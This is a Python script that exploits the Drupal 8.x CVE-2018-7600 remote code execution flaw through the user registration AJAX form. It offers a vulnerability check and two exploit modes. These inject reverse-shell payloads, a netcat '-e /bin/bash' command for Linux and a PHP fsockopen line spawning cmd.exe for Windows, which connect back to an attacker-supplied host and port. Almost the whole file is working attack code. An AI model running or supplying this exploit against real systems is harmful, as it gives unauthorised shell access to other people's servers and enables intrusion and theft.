#!/usr/bin/env python3
import sys
import requests



def test_target():
        #getting the ip address to test and adding the path to the vulnerability
        rhost = raw_input('what is the address of the target machine (example: https://10.10.10.10/): ')
        target_url = rhost+ 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        print ("[*] Testing if target is vulnerable")
        try:
        #sending the malicious request along with a command to be executed by the RCE vulnerability
                r = requests.post(target_url, headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0;; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo 'haha'"})
                if r.status_code == 200:    
                        response = r.content  
                        #if the output of the command sent is in the response the target is vulnerable
                        if "haha" in response:    
                                print ("[!] The target is vulnerable")
                else:
                        print ("[*] - Target not vulnerable")
        except: 
                print ("[!] - Something went wrong")
def exploit_linux():
   #getting the necessary info to send a reverse shell
   rhost = raw_input('what is the address of the target machine (example: https://10.10.10.10/): ')
   lhost = raw_input('what is your local ip address (example: 10.10.10.10): ')
   lport = raw_input('what port do you want the target to listen on (example: 4444): ')
   verify = False
   revshell ="nc %s %s -e /bin/bash"%(lhost,lport) 
   #defining the url of the malicious request but this time the command to execute sends a reverse shell
   url = rhost + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
   payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': revshell}
   #sending the request 
   r = requests.post(url,data=payload,verify=verify)
   check = requests.get(rhost,verify=verify)
   if check.status_code != 200: 
     sys.exit("Not exploitable")
   print("check your listner")
   result = r.text
   print (result) 
def exploit_windows():
   #getting the necessary info to send a reverse shell
   rhost = raw_input('what is the address of the target machine (example: https://10.10.10.10/): ')
   lhost = raw_input('what is your local ip address (example: 10.10.10.10): ')
   lport = raw_input('what port do you want the target to listen on (example: 4444): ')
   verify = False
   revshell ="php -r '$sock=fsockopen(\"%s\",%s);exec(\"cmd.exe <&3 >&3 2>&3\");'"%(lhost,lport)
   #defining the url of the malicious request but this time the command to execute sends a reverse shell   
   url = rhost + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
   payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': revshell}
   #sending the request 
   r = requests.post(url,data=payload,verify=verify)
   check = requests.get(rhost,verify=verify)
   if check.status_code != 200: 
     sys.exit("Not exploitable")
   print("check your listner")
   result = r.text
   print (result)

print ('welcome to the automation script for the 8.x Drupal CVE-2018-7600')
a = input('press 0 for a scan and 1 to exploit:')
#checking if the user wants to scan or exploit the target
if a == 1 :
   #checking what OS are we targetting
   b = input('if you\'re targeting windows press 0 ,if not press 1 for linux:') 
   if b == 1 : exploit_linux()
   elif b == 0: exploit_windows()
   else : print("sorry 1 or 0 only by by") 
elif a == 0 :
   test_target()
else :
   print('''the output must be 0 or 1
            bye :)
   ''')
